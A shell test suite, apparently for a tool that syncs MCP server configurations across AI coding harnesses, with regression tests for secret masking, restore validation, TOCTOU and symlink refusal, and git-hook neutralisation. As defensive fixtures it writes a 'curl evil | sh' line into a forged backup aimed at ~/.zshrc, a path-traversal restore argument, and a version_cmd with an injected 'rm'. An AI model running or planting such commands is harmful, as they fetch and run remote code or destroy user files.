# F6: TOML — full expected document validated in memory BEFORE any write (fault-injected from the test side)
mk htv toml mcp_servers codex "~/.htv/config.toml" true enabled enabled-bool high
printf 'model = "m"\n' > "$HOME/.htv/config.toml"; chmod 600 "$HOME/.htv/config.toml"; V0="$(sum "$HOME/.htv/config.toml")"
o="$(python3 - "$BIN" "$HOME/.htv/config.toml" apply --ssot "$SSOT" --harness htv --registry "$REG" --state-dir "$SD" 2>&1 <<'PY'
import importlib.machinery, importlib.util, os, sys
path, target, argv = sys.argv[1], os.path.realpath(sys.argv[2]), sys.argv[3:]
loader = importlib.machinery.SourceFileLoader("hms", path)
spec = importlib.util.spec_from_loader("hms", loader); hms = importlib.util.module_from_spec(spec); loader.exec_module(hms)
real_surg, real_write = hms.toml_surgical, hms.atomic_write
hms.toml_surgical = lambda *a, **k: real_surg(*a, **k) + '\n[mcp_servers.injected]\ncommand = "x"\n'  # parses, but wrong doc
def watch(p, data, mode=0o600):
    if os.path.realpath(p) == target:
        print("TARGET-WRITTEN")
    return real_write(p, data, mode)
hms.atomic_write = watch
sys.stdout, sys.stderr = hms.Redactor(sys.stdout), hms.Redactor(sys.stderr)
code = hms.run(argv); sys.stdout.flush(); sys.exit(code)
PY
)"; rc=$?
printf '%s\n' "$o" >> "$ALLOUT"
eq 1 "$rc" 'F6: TOML doc mismatch: apply refused'
has 'does not match the expected document' "$o" 'F6: refusal reason'
hasnt 'TARGET-WRITTEN' "$o" 'F6: target never written (pre-write validation)'
eq "$V0" "$(sum "$HOME/.htv/config.toml")" 'F6: TOML unchanged'

# F7a: resolver CRLF stripped
mk hres json mcpServers mcpservers-json "~/.hres/mcp.json" true null null high
RESCR="$T/resolver-crlf.sh"; printf '#!/bin/sh\nprintf "%%s\\r\\n" "$FIXSECRET"\n' > "$RESCR"; chmod +x "$RESCR"
run apply --ssot "$SSOT3" --harness hres --resolver "$RESCR"
eq ok "$(python3 -c 'import json,os,sys; v=json.load(open(sys.argv[1]))["mcpServers"]["v"]["headers"]["A"]; print("ok" if v==os.environ["FIXSECRET"] else "bad")' "$HOME/.hres/mcp.json")" 'F7: resolver \r\n stripped'
# F7b: 1-3 char secrets masked in output
export SHORTS="Q7z"
echo '{"schema":1,"servers":{"s":{"transport":"stdio","command":"tool","args":["--k=${SHORTS}"],"env":{"E":"${SHORTS}"}}}}' > "$T/ssot-short.json"
run plan --ssot "$T/ssot-short.json" --harness hjson --json
hasnt 'Q7z' "$o" 'F7: short (3-char) secret masked in JSON output'
run plan --ssot "$T/ssot-short.json" --harness hjson
hasnt 'Q7z' "$o" 'F7: short secret masked in text output'
# F7c: manifest = per-install salted HMAC; salt file 0600
eq 600 "$(mode "$SD/salt")" 'F7: salt file mode 600'
HM="$(python3 - "$SD/manifest.json" "$HOME/.hmod/mcp.json" <<'PY'
import hashlib,json,os,sys
m=json.load(open(sys.argv[1])); p=os.path.realpath(sys.argv[2]); cur=json.load(open(p))["mcpServers"]
srv=m["files"][p]["servers"]; n=sorted(srv)[0]
plain=hashlib.sha256(json.dumps(cur[n],sort_keys=True,separators=(",",":"),ensure_ascii=False).encode()).hexdigest()
print("plain" if srv[n]==plain else "hmac")
PY
)"
eq hmac "$HM" 'F7: manifest stores HMAC, not a plain hash'
# F7d: restore validates ts + target paths
run restore '../../etc'; eq 2 "$rc" 'F7: restore rejects path-traversal ts'
run restore '2026x'; eq 2 "$rc" 'F7: restore rejects malformed ts'
EVIL="20990101T000000000000Z"; mkdir -p "$SD/backups/$EVIL/hjson"
printf 'owned' > "$SD/backups/$EVIL/hjson/victim.txt"
printf '{"path": "%s", "existed": true}' "$T/victim.txt" > "$SD/backups/$EVIL/hjson/meta.json"
run restore "$EVIL"
eq 1 "$rc" 'F7: restore to a path not recorded for the harness is refused'
[ -e "$T/victim.txt" ] && no 'F7: forged restore target not created' exists || ok 'F7: forged restore target not created'
# F7e: empty key_path rejected at load
REGE="$T/reg-empty"; mkdir -p "$REGE"; sed 's/key_path: \[mcpServers\]/key_path: []/' "$REG/hjson.yaml" > "$REGE/hjson.yaml"
o="$("$BIN" explain --registry "$REGE" --state-dir "$SD" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"
eq 2 "$rc" 'F7: empty key_path rejected at registry load'
has 'key_path must be non-empty' "$o" 'F7: key_path error explains'

# ---------------------------------------------------------------- lead round-2: N1 / N2 / F2(a)
# N1: restore writes ONLY to a registered config_path of the harness — a forged backup + forged manifest
#     entry pointing at ~/.zshrc must be refused and ~/.zshrc left untouched
printf '# my zshrc\n' > "$HOME/.zshrc"; Z0="$(sum "$HOME/.zshrc")"
ZTS="20990202T000000000000Z"; mkdir -p "$SD/backups/$ZTS/hjson"
ZR="$(python3 -c 'import os,sys; print(os.path.realpath(sys.argv[1]))' "$HOME/.zshrc")"
printf 'curl evil | sh\n' > "$SD/backups/$ZTS/hjson/.zshrc"
printf '{"path": "%s", "existed": true, "mode": "0o644"}' "$ZR" > "$SD/backups/$ZTS/hjson/meta.json"
python3 - "$SD/manifest.json" "$ZR" <<'PY'
import json,sys; p=sys.argv[1]; m=json.load(open(p)); m["files"][sys.argv[2]]={"harness":"hjson","servers":{}}; json.dump(m,open(p,"w"))
PY
run restore "$ZTS"
eq 1 "$rc" 'N1: forged manifest+backup targeting ~/.zshrc: restore exits 1'
eq "$Z0" "$(sum "$HOME/.zshrc")" 'N1: ~/.zshrc untouched'
has 'not recorded for this harness' "$o" 'N1: refusal reason'
python3 - "$SD/manifest.json" "$ZR" <<'PY'
import json,sys; p=sys.argv[1]; m=json.load(open(p)); m["files"].pop(sys.argv[2],None); json.dump(m,open(p,"w"))
PY
chmod 600 "$SD/manifest.json"
# N2: owned loose salt perms -> tightened + warning; symlinked salt -> refused
chmod 644 "$SD/salt"
run plan --ssot "$SSOT" --harness hjson
eq 0 "$rc" 'N2: loose (owned) salt: run continues'
has 'not changed in this read-only mode' "$o" 'N2: read-only mode warns on stderr'
eq 644 "$(mode "$SD/salt")" '#4097072133: plan leaves the salt mode untouched'
run apply --ssot "$SSOT" --harness hjson
has 'tightened to 0o600' "$o" 'N2: apply tightens + warns'
eq 600 "$(mode "$SD/salt")" 'N2: salt tightened to 600 by apply'
chmod 755 "$SD"; run plan --ssot "$SSOT" --harness hjson
eq 755 "$(mode "$SD")" '#4097072133: plan leaves a 0755 state dir unchanged'
for m in inventory verify; do run $m --harness hjson; done
eq 755 "$(mode "$SD")" '#4097072133: inventory/verify leave the state dir mode unchanged'
run apply --ssot "$SSOT" --harness hjson
eq 700 "$(mode "$SD")" 'N2: loose state dir tightened to 700 by apply'
mv "$SD/salt" "$SD/salt.real"; ln -s "$SD/salt.real" "$SD/salt"
run plan --ssot "$SSOT" --harness hjson
eq 2 "$rc" 'N2: symlinked salt refused'
has 'not owned by the current user or a symlink' "$o" 'N2: refusal reason'
rm "$SD/salt"; mv "$SD/salt.real" "$SD/salt"
# F2(a): literal secret-looking arg/header -> refused for git-visible targets, masked warning otherwise
LITS='Zx9!kQ2mP7vR4tLw'
printf '{"schema":1,"servers":{"lit-pos":{"transport":"stdio","command":"tool","args":["run","%s"]}}}\n' "$LITS" > "$T/ssot-lint.json"
run apply --ssot "$T/ssot-lint.json" --harness hgtrk
hasnt 'lit-pos' "$(cat "$HOME/gitrepo/tracked.json")" 'F2a: literal positional secret refused for tracked target'
has 'looks like a literal secret' "$o" 'F2a: lint warning emitted'
hasnt "$LITS" "$o" 'F2a: lint warning never prints the value'
run apply --ssot "$T/ssot-lint.json" --harness hjson --json
has 'lit-pos' "$(cat "$HOME/.hjson/mcp.json")" 'F2a: non-git target applied (warn-only)'
hasnt "$LITS" "$o" 'F2a: literal secret masked in apply JSON preview'

# ---------------------------------------------------------------- PR #455 PDCA regressions
# 4096370537: _entropy("") must not divide by zero
EZ="$(python3 - "$BIN" <<'PY'
import importlib.machinery, importlib.util, sys
ld = importlib.machinery.SourceFileLoader("hms", sys.argv[1])
m = importlib.util.module_from_spec(importlib.util.spec_from_loader("hms", ld)); ld.exec_module(m)
print(m._entropy(""), m._secretish_segment(""), m.literal_secretish(""))
PY
)"
eq "0.0 False False" "$EZ" '#4096370537: _entropy("") returns 0.0 (no ZeroDivisionError)'

# 4096445150: `replaces` never drops a legacy entry when the replacement is NOT written
cat > "$HOME/.hnohdr/mcp.json" <<'EOF'
{"mcpServers": {"legacy-a": {"command": "old-a"}, "legacy-b": {"command": "old-b"}}}
EOF
cat > "$T/ssot-rep.json" <<'EOF'
{"schema":1,"servers":{
 "new-remote":{"transport":"streamable-http","url":"https://n.example.test/mcp",
   "headers":{"X":"${OTHERVAL}"},"replaces":["legacy-a"]},
 "new-off":{"transport":"stdio","command":"tool","enabled":false,"replaces":["legacy-b"]}}}
EOF
run apply --ssot "$T/ssot-rep.json" --harness hnohdr --adopt legacy-a --adopt legacy-b --json
RP="$(python3 -c 'import json,sys; print(" ".join(sorted(json.load(open(sys.argv[1]))["mcpServers"])))' "$HOME/.hnohdr/mcp.json")"
eq "legacy-a legacy-b" "$RP" '#4096445150: skipped (no header support) + omitted (disabled) replacements keep their legacy entries'
hasnt '"action": "remove"' "$o" '#4096445150: no remove action scheduled for an unwritten replacement'

# 4096445189: bundled schema enforced at load (unknown fields, types) — names fields, never values
printf '{"schema":1,"servers":{"s":{"transport":"streamable-http","url":"https://s.test","header":{"A":"${FIXSECRET}"}}}}\n' > "$T/ssot-bad1.json"
run plan --ssot "$T/ssot-bad1.json" --harness hjson
eq 2 "$rc" '#4096445189: unknown field `header` rejected (exit 2)'
has 'unknown field(s): header' "$o" '#4096445189: error names the field'
printf '{"schema":1,"servers":{"s":{"transport":"stdio","command":"t","replaces":"legacy"}}}\n' > "$T/ssot-bad2.json"
run plan --ssot "$T/ssot-bad2.json" --harness hjson
eq 2 "$rc" '#4096445189: string `replaces` rejected (exit 2)'
has 'replaces must be a list of strings' "$o" '#4096445189: type error names the field'
printf '{"schema":1,"servers":{},"extra":1}\n' > "$T/ssot-bad3.json"
run plan --ssot "$T/ssot-bad3.json" --harness hjson; eq 2 "$rc" '#4096445189: unknown top-level field rejected'
printf '{"schema":1,"servers":{"s":{"transport":"stdio","command":"t","args":"-v"}}}\n' > "$T/ssot-bad4.json"
run plan --ssot "$T/ssot-bad4.json" --harness hjson; eq 2 "$rc" '#4096445189: string `args` rejected'
printf '{"schema":1,"servers":{"s":{"transport":"stdio","command":"t","harnesses":{"only":["x"]}}}}\n' > "$T/ssot-bad5.json"
run plan --ssot "$T/ssot-bad5.json" --harness hjson; eq 2 "$rc" '#4096445189: malformed `harnesses` selector rejected'
run plan --ssot "$SSOT" --harness hjson; eq 0 "$rc" '#4096445189: the valid fixture SSOT still loads'
EXS="$DIR/../../templates/harness-mcp-sync/ssot.example.json"
python3 - "$BIN" "$EXS" <<'PY' && ok '#4096445189: shipped ssot.example.json passes the validator' || no '#4096445189: shipped ssot.example.json passes the validator' "validator rejected it"
import importlib.machinery, importlib.util, json, sys
ld = importlib.machinery.SourceFileLoader("hms", sys.argv[1])
m = importlib.util.module_from_spec(importlib.util.spec_from_loader("hms", ld)); ld.exec_module(m)
m.validate_ssot(json.load(open(sys.argv[2])))
PY

# 4096473638: jsonc trailing-comma removal is string-aware ("x,}" survives)
cat > "$HOME/.hjsonc/mcp.json" <<'EOF'
{
  // user comment
  "pattern": "x,}",
  "list": ["a, ]", "b",],
  "servers": {},
}
EOF
run apply --ssot "$SSOT" --harness hjsonc --allow-comment-loss --json
eq 0 "$rc" '#4096473638: jsonc with trailing commas + comma-brace strings applies'
JV="$(python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); print(d["pattern"]+"|"+"|".join(d["list"]))' "$HOME/.hjsonc/mcp.json")"
eq 'x,}|a, ]|b' "$JV" '#4096473638: string values "x,}" and "a, ]" preserved byte-for-byte'

# 4096473648: TOCTOU — config rewritten between plan-read and write -> refused, file keeps the new bytes
mk htoc json mcpServers mcpservers-json "~/.htoc/mcp.json" true null null high
echo '{"mcpServers":{}}' > "$HOME/.htoc/mcp.json"
TOCRES="$T/toc-resolver.sh"
cat > "$TOCRES" <<'EOF'
#!/bin/sh
printf '{"mcpServers":{},"harness":"rewrote-me"}' > "$HOME/.htoc/mcp.json"
printf '%s' "$FIXSECRET"
EOF
chmod +x "$TOCRES"
printf '{"schema":1,"servers":{"v":{"transport":"streamable-http","url":"https://v.test","headers":{"A":"op://vault/item/f"}}}}\n' > "$T/ssot-toc.json"
run apply --ssot "$T/ssot-toc.json" --harness htoc --resolver "$TOCRES" --json
eq 1 "$rc" '#4096473648: config changed after plan-read: apply exits 1'
has 'config changed since plan; re-run apply' "$o" '#4096473648: refusal reason'
has 'rewrote-me' "$(cat "$HOME/.htoc/mcp.json")" '#4096473648: concurrent rewrite preserved (not clobbered)'
hasnt '"v"' "$(cat "$HOME/.htoc/mcp.json")" '#4096473648: no managed entry written over the changed file'
rm -f "$HOME/.htoc/mcp.json"
TOCRES2="$T/toc-resolver2.sh"
printf '#!/bin/sh\necho "{}" > "$HOME/.htoc/mcp.json"\nprintf "%%s" "$FIXSECRET"\n' > "$TOCRES2"; chmod +x "$TOCRES2"
run apply --ssot "$T/ssot-toc.json" --harness htoc --resolver "$TOCRES2" --json
eq 1 "$rc" '#4096473648: file created after plan (existence changed): refused'
eq '{}' "$(cat "$HOME/.htoc/mcp.json")" '#4096473648: newly created file untouched'

# 4096445171: platform-specific config paths (real vscode / vscode-insiders registry files)
cp "$DIR/../../harnesses/vscode.yaml" "$DIR/../../harnesses/vscode-insiders.yaml" "$REG/"
PL="$(HARNESS_MCP_SYNC_PLATFORM=linux "$BIN" explain --harness vscode,vscode-insiders --registry "$REG" --state-dir "$SD" --json 2>&1)"
printf '%s\n' "$PL" >> "$ALLOUT"
has "$HOME/.config/Code/User/mcp.json" "$PL" '#4096445171: linux -> ~/.config/Code/User/mcp.json'
has "$HOME/.config/Code - Insiders/User/mcp.json" "$PL" '#4096445171: linux Insiders -> ~/.config/Code - Insiders/User/mcp.json'
hasnt 'Library/Application Support' "$PL" '#4096445171: no macOS path selected on linux'
PD="$(HARNESS_MCP_SYNC_PLATFORM=darwin "$BIN" explain --harness vscode --registry "$REG" --state-dir "$SD" --json 2>&1)"; rc=$?; printf '%s\n' "$PD" >> "$ALLOUT"
has 'Library/Application Support/Code/User/mcp.json' "$PD" '#4096445171: darwin -> ~/Library/.../Code/User/mcp.json'
PW="$(HARNESS_MCP_SYNC_PLATFORM=win32 "$BIN" explain --harness vscode --registry "$REG" --state-dir "$SD" --json 2>&1)"; rc=$?; printf '%s\n' "$PW" >> "$ALLOUT"
has 'no user-scope config path in registry for platform win32' "$PW" '#4096445171: undocumented OS -> skipped, never a guessed path'
DOPL="$(python3 - "$DIR/../../harnesses" <<'PY'
import glob, sys, yaml
bad = []
for f in sorted(glob.glob(sys.argv[1] + "/*.yaml")):
    for cp in (yaml.safe_load(open(f)).get("mcp") or {}).get("config_paths") or []:
        if "Library/Application Support" in cp.get("path", "") and cp.get("platform") != "darwin":
            bad.append(f.rsplit("/", 1)[1])
print(" ".join(bad))
PY
)"
eq "" "$DOPL" '#4096445171: every ~/Library path in the registry is tagged platform: darwin'
rm -f "$REG/vscode.yaml" "$REG/vscode-insiders.yaml"

# 4096473693: crush stdio entries carry an explicit type (config.go requires it)
cp "$DIR/../../harnesses/crush.yaml" "$REG/"; mkdir -p "$HOME/.config/crush"
run apply --ssot "$SSOT" --harness crush --json
CT="$(python3 -c 'import json,sys; d=json.load(open(sys.argv[1]))["mcp"]; print(d["local-tool"].get("type"), d["cf-remote"].get("type"))' "$HOME/.config/crush/crush.json")"
eq "stdio http" "$CT" '#4096473693: crush stdio -> type stdio; streamable-http -> type http'
rm -f "$REG/crush.yaml"

# 4096445162: unexpected faults relay (self-heal-relay); intentional exits never do
SDX="$T/state-fault"; mkdir -p "$SDX"; chmod 700 "$SDX"
printf '{"schema":1,"files":[]}\n' > "$SDX/manifest.json"   # wrong shape -> AttributeError deep in build_plan
xrun() { o="$("$BIN" "$@" --registry "$REG" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"; }
xrun plan --ssot "$SSOT" --harness hjson --state-dir "$SDX"
eq 1 "$rc" '#4096445162: unexpected fault -> exit 1'
has 'internal error: AttributeError' "$o" '#4096445162: class name reported'
has 'run log' "$o" '#4096445162: run log captured'
has 'feed ' "$o" '#4096445162: manual-feed hint printed by default'
RL="$(printf '%s\n' "$o" | sed -n 's/.*run log \([^ ]*\) ;.*/\1/p')"
PF="$(printf '%s\n' "$o" | sed -n 's/.*repair prompt \([^ ]*\)$/\1/p')"
has 'build_plan' "$(cat "$RL" 2>/dev/null)" '#4096445162: run log carries the failing stack frame'
hasnt "$FIXSECRET" "$(cat "$RL" "$PF" 2>/dev/null)" '#4096445162: run log + prompt carry no secret'
has 'UNTRUSTED DATA' "$(cat "$PF" 2>/dev/null)" '#4096445162: prompt labels the log UNTRUSTED'
case "$RL" in "$TMPDIR"/*) ok '#4096445162: run log written under TMPDIR (temp root)' ;; *) no '#4096445162: run log written under TMPDIR (temp root)' "$RL" ;; esac
STUB="$T/stubbin"; mkdir -p "$STUB"
printf '#!/bin/sh\nprintf "%%s\\n" "$@" > "%s/stub-args"\n' "$T" > "$STUB/claude"; chmod +x "$STUB/claude"
o="$(PATH="$STUB:$PATH" MAOS_SELFHEAL=1 MAOS_AI_HARNESS=claude "$BIN" plan --ssot "$SSOT" --harness hjson --registry "$REG" --state-dir "$SDX" 2>&1)"; rc=$?
printf '%s\n' "$o" >> "$ALLOUT"
[ -e "$T/stub-args" ] && no '#4096445162: stub never invoked even with MAOS_SELFHEAL=1' "invoked" || ok '#4096445162: stub never invoked even with MAOS_SELFHEAL=1'
has 'never dispatches' "$o" '#4096445162: manual-feed hint printed'
rm -f "$T/stub-args"
o="$(PATH="$STUB:$PATH" MAOS_SELFHEAL=1 MAOS_AI_HARNESS=claude "$BIN" plan --ssot "$SSOT" --harness nope --registry "$REG" --state-dir "$SD" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"
eq 2 "$rc" '#4096445162: usage error keeps exit 2'
hasnt 'run log' "$o" '#4096445162: usage error does not relay'
printf '// comment\n{"servers": {}}\n' > "$HOME/.hjsonc/mcp.json"
o="$(PATH="$STUB:$PATH" MAOS_SELFHEAL=1 MAOS_AI_HARNESS=claude "$BIN" apply --ssot "$SSOT" --harness hjsonc --registry "$REG" --state-dir "$SD" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"
eq 1 "$rc" '#4096445162: refused/drift keeps exit 1'
hasnt 'run log' "$o" '#4096445162: refusal does not relay'
[ -e "$T/stub-args" ] && no '#4096445162: stub never invoked for intentional exits' "invoked" || ok '#4096445162: stub never invoked for intentional exits'

# Copilot overview (state-directory symlinks): state dir / backups dir may not be a symlink
REDIR="$T/elsewhere"; mkdir -p "$REDIR"; ln -s "$REDIR" "$T/state-link"
o="$("$BIN" apply --ssot "$SSOT" --harness hjson --registry "$REG" --state-dir "$T/state-link" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"
eq 2 "$rc" 'Copilot/state-dir: symlinked state dir refused (exit 2)'
has 'a symlink' "$o" 'Copilot/state-dir: refusal names the reason'
eq "" "$(ls -A "$REDIR")" 'Copilot/state-dir: nothing written through the link'
SDB="$T/state-b"; mkdir -p "$SDB"; chmod 700 "$SDB"; ln -s "$REDIR" "$SDB/backups"
cat > "$HOME/.hjson/mcp.json" <<'EOF'
{"mcpServers": {}}
EOF
o="$("$BIN" apply --ssot "$SSOT" --harness hjson --registry "$REG" --state-dir "$SDB" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"
eq 2 "$rc" 'Copilot/state-dir: symlinked backups dir refused (exit 2)'
eq "" "$(ls -A "$REDIR")" 'Copilot/state-dir: no backup written through the link'
eq '{"mcpServers": {}}' "$(cat "$HOME/.hjson/mcp.json")" 'Copilot/state-dir: config untouched when backups cannot be written safely'

# Copilot overview (no-op/adopt-only plans rewrite files): adopt of an identical entry = manifest only
mk hadopt json mcpServers mcpservers-json "~/.hadopt/mcp.json" true null null high
printf '{"mcpServers":{"local-tool":{"command":"npx","args":["-y","pkg"],"env":{"K":"plain-env-value-42"}}},"z":1}' > "$HOME/.hadopt/mcp.json"
A0="$(sum "$HOME/.hadopt/mcp.json")"
cat > "$T/ssot-adopt.json" <<'EOF'
{"schema":1,"servers":{"local-tool":{"transport":"stdio","command":"npx","args":["-y","pkg"],"env":{"K":"${OTHERVAL}"}}}}
EOF
run apply --ssot "$T/ssot-adopt.json" --harness hadopt --adopt local-tool --json
eq 0 "$rc" 'adopt-only: exit 0'
has 'manifest only; file untouched' "$o" 'adopt-only: reported as manifest-only'
eq "$A0" "$(sum "$HOME/.hadopt/mcp.json")" 'adopt-only: file bytes unchanged (no reformat)'
run plan --ssot "$T/ssot-adopt.json" --harness hadopt --json
hasnt 'conflict' "$o" 'adopt-only: entry now owned (no conflict on re-plan)'

# ---------------------------------------------------------------- delta red-team on 65b60c3 (S1 opt-in self-heal, S2 malformed entries)
PYDIR="$(dirname "$(command -v python3)")"
SH="$T/stub-all"; mkdir -p "$SH"; SHLOG="$T/stub-invocations"; : > "$SHLOG"
for n in kiro-cli claude codex opencode gemini crush amp; do
  printf '#!/bin/sh\necho "%s" >> "%s"\nenv > "%s/stub-env-%s"\nprintf "%%s\\n" "$@" > "%s/stub-argv-%s"\nexit 0\n' \
    "$n" "$SHLOG" "$T" "$n" "$T" "$n" > "$SH/$n"; chmod +x "$SH/$n"
done
SPATH="$SH:$PYDIR:/usr/bin:/bin"
export DUMMYTOK="dummytok-4Qz9Lx7Rv2Wn8Kp3Ys6T"
export OP_SERVICE_ACCOUNT_TOKEN="ops_dummy-8Hc2Vn5Rq9Lm4Tx7Wb1Z"
# red-team exact repro: stub crush first on PATH + DUMMYTOK + string-valued entry + --adopt
mk hmal json mcpServers mcpservers-json "~/.hmal/mcp.json" true null null high
printf '{"mcpServers":{"local-tool":"oops-%s"}}' "$DUMMYTOK" > "$HOME/.hmal/mcp.json"
M0="$(sum "$HOME/.hmal/mcp.json")"
o="$(env -u MAOS_SELFHEAL PATH="$SPATH" "$BIN" apply --ssot "$T/ssot-adopt.json" --harness hmal --adopt local-tool --registry "$REG" --state-dir "$SD" 2>&1)"; rc=$?
printf '%s\n' "$o" >> "$ALLOUT"
eq 1 "$rc" 'S2: string-valued entry + --adopt -> exit 1 (refused, no exception)'
has 'malformed entry local-tool' "$o" 'S2: message names the server'
has 'mcpServers' "$o" 'S2: message names the field path'
hasnt 'Traceback' "$o" 'S2: no traceback'
hasnt 'internal error' "$o" 'S2: not an unexpected fault'
hasnt 'oops' "$o" 'S2: entry value never printed'
eq "$M0" "$(sum "$HOME/.hmal/mcp.json")" 'S2: malformed config left untouched'
eq "" "$(cat "$SHLOG")" 'S1: exact repro -> 0 AI-harness dispatches by default'
run plan --ssot "$T/ssot-adopt.json" --harness hmal --json
eq 1 "$rc" 'S2: plan on malformed entry -> exit 1'
has 'malformed entry local-tool' "$o" 'S2: plan reports the malformed entry'
printf '{"mcpServers":"not-a-map"}' > "$HOME/.hmal/mcp.json"
run apply --ssot "$T/ssot-adopt.json" --harness hmal --json
eq 1 "$rc" 'S2: non-mapping key_path refused (exit 1)'
has 'malformed mcpServers' "$o" 'S2: non-mapping key_path named'
eq '{"mcpServers":"not-a-map"}' "$(cat "$HOME/.hmal/mcp.json")" 'S2: non-mapping key_path not overwritten'
# S1: unexpected fault, default (MAOS_SELFHEAL unset) -> log only, no dispatch
: > "$SHLOG"
o="$(env -u MAOS_SELFHEAL PATH="$SPATH" "$BIN" plan --ssot "$SSOT" --harness hjson --registry "$REG" --state-dir "$SDX" 2>&1)"; rc=$?
printf '%s\n' "$o" >> "$ALLOUT"
eq 1 "$rc" 'S1: injected fault -> exit 1'
has 'run log' "$o" 'S1: default still writes the redacted run log'
has 'never dispatches' "$o" 'S1: default prints the manual-feed hint'
eq "" "$(cat "$SHLOG")" 'S1: default never dispatches (stubs untouched)'
# S1: even opted in (MAOS_SELFHEAL=1, any harness order) nothing is ever dispatched
: > "$SHLOG"
o="$(PATH="$SPATH" MAOS_SELFHEAL=1 MAOS_AI_HARNESS="kiro-cli claude codex opencode gemini crush amp" "$BIN" plan --ssot "$SSOT" --harness hjson --registry "$REG" --state-dir "$SDX" 2>&1)"; rc=$?
printf '%s\n' "$o" >> "$ALLOUT"
eq 1 "$rc" 'S1: injected fault with MAOS_SELFHEAL=1 -> exit 1'
eq "" "$(cat "$SHLOG")" 'S1: MAOS_SELFHEAL=1 -> 0 dispatches (every stub untouched)'
has 'never dispatches because it handles secrets' "$o" 'S1: hint states the executor never dispatches'
RL="$(printf '%s\n' "$o" | sed -n 's/.*run log \([^ ]*\) ;.*/\1/p')"
PF="$(printf '%s\n' "$o" | sed -n 's/.*repair prompt \([^ ]*\)$/\1/p')"
eq 600 "$(mode "$RL")" 'S1: run log is 0600'
eq 600 "$(mode "$PF")" 'S1: repair prompt is 0600'
hasnt "$DUMMYTOK" "$(cat "$RL" "$PF")" 'S1: log + prompt carry no DUMMYTOK value'
hasnt "$OP_SERVICE_ACCOUNT_TOKEN" "$(cat "$RL" "$PF")" 'S1: log + prompt carry no OP_* value'
hasnt "$FIXSECRET" "$(cat "$RL" "$PF")" 'S1: log + prompt carry no resolved SSOT secret'
# S2: verify on an owned entry that became non-mapping -> reported, no crash
printf '{"mcpServers":{"local-tool":"oops-hand"},"z":1}' > "$HOME/.hadopt/mcp.json"
run verify --harness hadopt
eq 1 "$rc" 'S2: verify on malformed owned entry -> exit 1'
has 'malformed entry local-tool' "$o" 'S2: verify names the malformed entry'
hasnt 'Traceback' "$o" 'S2: verify does not crash'
hasnt 'oops' "$o" 'S2: verify never prints the value'
unset DUMMYTOK OP_SERVICE_ACCOUNT_TOKEN
rm -f "$REG/hmal.yaml"

# ---------------------------------------------------------------- final red-team hardening (git -c, stdin=DEVNULL, version_cmd)
# (1) git probes never run repo-configured fsmonitor / hooks
GR="$HOME/gitrepo"; mkdir -p "$GR"; git -C "$GR" init -q
printf '#!/bin/sh\ntouch "%s/fsmon-ran"\nexit 1\n' "$T" > "$T/fsmon.sh"; chmod +x "$T/fsmon.sh"
git -C "$GR" config core.fsmonitor "$T/fsmon.sh"
mkdir -p "$GR/.git/hooks"; printf '#!/bin/sh\ntouch "%s/hook-ran"\n' "$T" > "$GR/.git/hooks/post-checkout"; chmod +x "$GR/.git/hooks/post-checkout"
mk hgit json mcpServers mcpservers-json "~/gitrepo/mcp.json" true null null high
printf '{"mcpServers":{}}' > "$GR/mcp.json"; git -C "$GR" add mcp.json >/dev/null 2>&1; rm -f "$T/fsmon-ran" "$T/hook-ran"
run plan --ssot "$SSOT" --harness hgit --json
has 'tracked' "$o" 'git -c: tracked state still detected'
[ -e "$T/fsmon-ran" ] && no 'git -c: repo core.fsmonitor never executed' "ran" || ok 'git -c: repo core.fsmonitor never executed'
[ -e "$T/hook-ran" ] && no 'git -c: repo hooks never executed' "ran" || ok 'git -c: repo hooks never executed'
has 'core.fsmonitor=false' "$(grep -n '_GIT = ' "$BIN")" 'git -c: fsmonitor disabled in the git argv'
has 'core.hooksPath=/dev/null' "$(grep -n '_GIT = ' "$BIN")" 'git -c: hooksPath neutralised in the git argv'
eq 0 "$(grep -cE 'subprocess\.run\(\["git"' "$BIN")" 'git -c: no raw git call bypasses _GIT'
rm -f "$REG/hgit.yaml"
# (2) every subprocess gets stdin=DEVNULL
eq "$(grep -c 'subprocess\.run(' "$BIN")" "$(grep -A1 'subprocess\.run(' "$BIN" | grep -c 'stdin=subprocess.DEVNULL')" 'stdin: every subprocess.run passes stdin=DEVNULL'
RIN="$T/resolver-stdin.sh"; printf '#!/bin/sh\ncat > "%s/res-stdin"\nprintf "%%s" "$FIXSECRET"\n' "$T" > "$RIN"; chmod +x "$RIN"
o="$(printf 'PARENT-STDIN-LEAK\n' | "$BIN" plan --ssot "$SSOT3" --harness hjson --resolver "$RIN" --registry "$REG" --state-dir "$SD" 2>&1)"; rc=$?
printf '%s\n' "$o" >> "$ALLOUT"
eq 0 "$rc" 'stdin: resolver still resolves'
eq "" "$(cat "$T/res-stdin" 2>/dev/null)" 'stdin: resolver cannot read the parent stdin'
rm -f "$T/fixh-stdin"
o="$(printf 'PARENT-STDIN-LEAK\n' | "$BIN" update --harness hjson --registry "$REG" --state-dir "$SD" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"
has 'fixture-hjson 1.0' "$o" 'stdin: version probe still runs'
eq "" "$(cat "$T/fixh-stdin" 2>/dev/null)" 'stdin: version probe cannot read the parent stdin'
# (3) version_cmd constrained at registry load (+ again before running)
REGV="$T/regv"; mkdir -p "$REGV"
vload() { # version_cmd -> sets o/rc from explain on a one-file registry
  sed -e "s|version_cmd: \"fixh --version\"|version_cmd: \"$1\"|" "$REG/hjson.yaml" > "$REGV/hjson.yaml"
  o="$("$BIN" explain --harness hjson --registry "$REGV" --state-dir "$SD" 2>&1)"; rc=$?; printf '%s\n' "$o" >> "$ALLOUT"; }
vload 'claude -p x';  eq 2 "$rc" 'version_cmd "claude -p x" rejected at load (exit 2)'
has 'version_cmd rejected for harness hjson' "$o" 'version_cmd rejection names the harness'
vload 'fixh -V';      eq 2 "$rc" 'version_cmd "-V" rejected (not on allow-list)'
vload 'fixh --version --x'; eq 2 "$rc" 'version_cmd with extra args rejected'
vload 'sh --version'; eq 2 "$rc" 'version_cmd argv[0] not in detect.commands rejected'
vload 'fixh;rm --version'; eq 2 "$rc" 'version_cmd shell-ish argv[0] rejected'
